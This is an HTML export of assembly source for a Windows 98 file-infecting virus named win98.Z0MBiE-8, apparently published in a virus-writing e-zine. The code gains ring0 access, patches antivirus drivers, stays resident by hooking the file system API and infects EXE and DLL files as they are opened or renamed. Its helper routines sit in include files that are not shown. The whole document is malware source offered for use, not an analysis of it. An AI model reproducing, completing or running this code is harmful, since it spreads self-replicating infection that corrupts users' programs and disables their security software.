<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">; win98.Z0MBiE-8</span><span class="sc0">
</span><span class="sc1">; written for MATRiX #2 E-Zine</span><span class="sc0">
</span><span class="sc1">; http://z0mbie.cjb.net</span><span class="sc0">

</span><span class="sc5">IN_GDT_BASE</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">800h</span><span class="sc0">    </span><span class="sc1">; vir offs in the GDT</span><span class="sc0">

</span><span class="sc5">INFECT_MIN_SIZE</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">8192</span><span class="sc0">    </span><span class="sc1">; min file size</span><span class="sc0">
</span><span class="sc5">INFECT_MAX_SIZE</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">524288</span><span class="sc0">  </span><span class="sc1">; max size</span><span class="sc0">
</span><span class="sc5">INFECT_ADD_SIZE</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">16384</span><span class="sc0">   </span><span class="sc1">; add to size when allocating memory</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0">                 </span><span class="sc5">macros.inc</span><span class="sc0">      </span><span class="sc1">; some macros: vxdcall, pusho, getofs</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">                 </span><span class="sc5">consts.inc</span><span class="sc0">      </span><span class="sc1">; consts</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">                 </span><span class="sc5">mz.inc</span><span class="sc0">          </span><span class="sc1">; MZ header</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">                 </span><span class="sc5">pe.inc</span><span class="sc0">          </span><span class="sc1">; PE header</span><span class="sc0">

                        </span><span class="sc5">p386</span><span class="sc0">
                        </span><span class="sc5">model</span><span class="sc0">   </span><span class="sc10">flat</span><span class="sc0">
                        </span><span class="sc5">locals</span><span class="sc0">  </span><span class="sc5">__</span><span class="sc0">

                        </span><span class="sc9">.data</span><span class="sc0">
</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">                    </span><span class="sc1">; 0C3h -- 'alredy TSR' sign</span><span class="sc0">

</span><span class="sc5">entry</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">callring0</span><span class="sc0">       </span><span class="sc1">; enter ring0 &amp; do bad stuff</span><span class="sc0">

                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0E9h</span><span class="sc0">            </span><span class="sc1">; JMP back to host</span><span class="sc0">
</span><span class="sc5">oldeip</span><span class="sc0">                  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">                    </span><span class="sc1">; need for first exec</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0">                 </span><span class="sc5">ring0.inc</span><span class="sc0">               </span><span class="sc1">; ring0-entering subroutine</span><span class="sc0">

                        </span><span class="sc1">; called in ring0</span><span class="sc0">
</span><span class="sc5">ring0</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc6">pusha</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">killavxd</span><span class="sc0">        </span><span class="sc1">; patch AV vxds</span><span class="sc0">

                        </span><span class="sc5">getofs</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">              </span><span class="sc1">; ESI&lt;--old base</span><span class="sc0">

</span><span class="sc1">;                       push    virsize</span><span class="sc0">
</span><span class="sc1">;                       VxDcall IFSMGR, GetHeap</span><span class="sc0">
</span><span class="sc1">;                       pop     ecx                     ; ECX&lt;--virsize</span><span class="sc0">
</span><span class="sc1">;                       xchg    edi, eax                ; EDI&lt;--new base</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_gdt_base</span><span class="sc0">            </span><span class="sc1">; EAX&lt;--GDT.base</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">IN_GDT_BASE</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; EDI&lt;--new base</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">virsize</span><span class="sc0">            </span><span class="sc1">; ECX&lt;--virsize</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0C3h</span><span class="sc0">    </span><span class="sc1">; alredy TSR ?</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__exit</span><span class="sc0">

                        </span><span class="sc6">pusha</span><span class="sc0">
                        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">                   </span><span class="sc1">; copy virus</span><span class="sc0">
                        </span><span class="sc6">popa</span><span class="sc0">

                        </span><span class="sc1">; install FileSystemApiHook</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">ifs_handler</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc5">VxDcall</span><span class="sc0"> </span><span class="sc5">IFSMGR</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">InstallFileSystemApiHook</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">ifs_oldhandler</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">__exit</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">

                        </span><span class="sc1">; get GDT.base into EAX</span><span class="sc0">
</span><span class="sc5">get_gdt_base</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">sgdt</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">ifs_handler</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_gdt_base</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'Z'</span><span class="sc0">     </span><span class="sc1">; check invirus-flag</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ifs_quit</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'Z'</span><span class="sc0">     </span><span class="sc1">; set invirus-flag</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc5">._function</span><span class="sc0">    </span><span class="sc1">; check function</span><span class="sc0">
                        
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IFSFN_OPEN</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ifs_func1</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IFSFN_RENAME</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ifs_func1</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IFSFN_FILEATTRIB</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ifs_func1</span><span class="sc0">

</span><span class="sc5">ifs_func1_exit</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_gdt_base</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; clear invirus-flag</span><span class="sc0">

</span><span class="sc5">ifs_quit</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">068h</span><span class="sc0">
</span><span class="sc5">ifs_oldhandler</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">ifs_func1</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">pusha</span><span class="sc0">
                        </span><span class="sc6">enter</span><span class="sc0">   </span><span class="sc5">MAXPATH</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; ESP = db MAXPATH dup (?)</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
                        </span><span class="sc6">cld</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc5">._drive</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MAXPATH</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                        </span><span class="sc6">jle</span><span class="sc0">     </span><span class="sc5">__exit</span><span class="sc0">

                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'A'</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; drive</span><span class="sc0">
                        </span><span class="sc6">stosb</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">':'</span><span class="sc0">         </span><span class="sc1">; ':'</span><span class="sc0">
                        </span><span class="sc6">stosb</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc5">._ioreq_ptr</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MAXPATH</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; eax &lt;-- filename</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">          </span><span class="sc1">; skip "</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc5">._codepage</span><span class="sc4">+</span><span class="sc5">MAXPATH</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc0"> </span><span class="sc1">; BCS_WANSI/BCS_OEM</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MAXPATH</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">; max name length</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; uni-str</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">; output-str</span><span class="sc0">
                        </span><span class="sc5">VxDcall</span><span class="sc0"> </span><span class="sc5">IFSMGR</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">UniToBCSPath</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">

                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">        </span><span class="sc1">; converted normally?</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">__exit</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">   </span><span class="sc1">; NUL</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20202000h</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'m0z.'</span><span class="sc0">     </span><span class="sc1">; 'exe.'   [will be copiled;</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__call_infect</span><span class="sc0">   </span><span class="sc1">;           then patched]</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'m0z.'</span><span class="sc0">     </span><span class="sc1">; 'lld.'</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__call_infect</span><span class="sc0">

                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__exit</span><span class="sc0">

</span><span class="sc5">__call_infect</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">call_infect_file</span><span class="sc0">

</span><span class="sc5">__exit</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc6">leave</span><span class="sc0">
                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ifs_func1_exit</span><span class="sc0">

</span><span class="sc1">; input: EDX=file name</span><span class="sc0">

</span><span class="sc5">call_infect_file</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">pusha</span><span class="sc0">

                        </span><span class="sc1">; easy way to check if file is opened</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r0_fgetattr</span><span class="sc0">     </span><span class="sc1">; get attribs (ECX)</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r0_fsetattr</span><span class="sc0">     </span><span class="sc1">; set attribs (ECX)</span><span class="sc0">
                        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">__exit</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r0_fopen_ro</span><span class="sc0">     </span><span class="sc1">; open file in read-only mode</span><span class="sc0">
                        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">__exit</span><span class="sc0">
                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r0_fgetsize</span><span class="sc0">     </span><span class="sc1">; get file size</span><span class="sc0">
                        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">__close</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; ESI = file size</span><span class="sc0">

                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">INFECT_MIN_SIZE</span><span class="sc0">    </span><span class="sc1">; check file size</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">INFECT_MAX_SIZE</span><span class="sc4">-</span><span class="sc5">INFECT_MIN_SIZE</span><span class="sc0">
                        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">__close</span><span class="sc0">

                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">INFECT_ADD_SIZE</span><span class="sc4">+</span><span class="sc2">4095</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">          </span><span class="sc1">; EDI = # of pages</span><span class="sc0">

                        </span><span class="sc6">pusha</span><span class="sc0">                   </span><span class="sc1">; allocate memory</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PAGEFIXED</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PAGEZEROINIT</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; PhysAddr</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; maxPhys</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; minPhys</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; Align</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; handle of VM (==0 if PG_SYS)</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PG_SYS</span><span class="sc0">  </span><span class="sc1">; flags</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">     </span><span class="sc1">; nPages</span><span class="sc0">
                        </span><span class="sc5">VMMcall</span><span class="sc0"> </span><span class="sc5">PageAllocate</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; popa.edx</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__close</span><span class="sc0">

                        </span><span class="sc1">; read whole file into memory</span><span class="sc0">
                        </span><span class="sc6">pusha</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">        </span><span class="sc1">; ecx=size</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">        </span><span class="sc1">; esi=pos</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r0_fread</span><span class="sc0">
                        </span><span class="sc6">popa</span><span class="sc0">

                        </span><span class="sc1">; infect file in memory</span><span class="sc0">
                        </span><span class="sc6">pusha</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">                     </span><span class="sc1">; EDI=fileptr</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                     </span><span class="sc1">; ESI=filesize</span><span class="sc0">
                        </span><span class="sc5">getofs</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; virstart</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">virsize</span><span class="sc0">                 </span><span class="sc1">; virsize</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">entry</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">             </span><span class="sc1">; virentry</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">oldeip</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">            </span><span class="sc1">; oldeip</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect_file</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; popa.esi == new file size</span><span class="sc0">
                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">__skip_update</span><span class="sc0">

                        </span><span class="sc1">; if infected, write file back to disk</span><span class="sc0">
                        </span><span class="sc6">pusha</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r0_make_handle_rw</span><span class="sc0">       </span><span class="sc1">; fuck share</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">        </span><span class="sc1">; ecx=size</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">        </span><span class="sc1">; esi=pos</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r0_fwrite</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r0_make_handle_ro</span><span class="sc0">       </span><span class="sc1">; restore share</span><span class="sc0">
                        </span><span class="sc6">popa</span><span class="sc0">

                        </span><span class="sc1">; free memory</span><span class="sc0">
</span><span class="sc5">__skip_update</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">pusha</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
                        </span><span class="sc5">VMMcall</span><span class="sc0"> </span><span class="sc5">PageFree</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">popa</span><span class="sc0">

                        </span><span class="sc1">; close file</span><span class="sc0">
</span><span class="sc5">__close</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r0_fclose</span><span class="sc0">

</span><span class="sc5">__exit</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0">                 </span><span class="sc5">r0io.inc</span><span class="sc0">                </span><span class="sc1">; r0 file io</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">                 </span><span class="sc5">infect.inc</span><span class="sc0">              </span><span class="sc1">; infect engine</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">                 </span><span class="sc5">killavxd.inc</span><span class="sc0">            </span><span class="sc1">; av vxds fuckup stuff</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">                 </span><span class="sc5">uncall.inc</span><span class="sc0">              </span><span class="sc1">; vxdcall restoring</span><span class="sc0">

                        </span><span class="sc9">align</span><span class="sc0">   </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">virsize</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'----------------------------'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'virsize = '</span><span class="sc4">,</span><span class="sc5">virsize</span><span class="sc4">/</span><span class="sc2">1000</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">+</span><span class="sc12">'0'</span><span class="sc4">,</span><span class="sc5">virsize</span><span class="sc4">/</span><span class="sc2">100</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">+</span><span class="sc12">'0'</span><span class="sc4">,</span><span class="sc5">virsize</span><span class="sc4">/</span><span class="sc2">10</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">+</span><span class="sc12">'0'</span><span class="sc4">,</span><span class="sc5">virsize</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">+</span><span class="sc12">'0'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
